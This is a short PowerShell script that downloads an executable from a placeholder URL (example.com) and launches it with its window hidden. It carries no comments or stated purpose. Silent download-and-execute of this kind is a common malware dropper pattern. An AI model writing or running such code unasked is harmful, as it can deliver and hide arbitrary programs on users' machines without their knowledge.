$sourceUrl = "http://example.com/file.exe"
$destinationPath = "C:\downloads\file.exe"
$arguments = "-WindowStyle Hidden"

$client = New-Object System.Net.WebClient
$client.DownloadFile($sourceUrl, $destinationPath)

$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = $destinationPath
$process.StartInfo.Arguments = $arguments
$process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$process.Start()
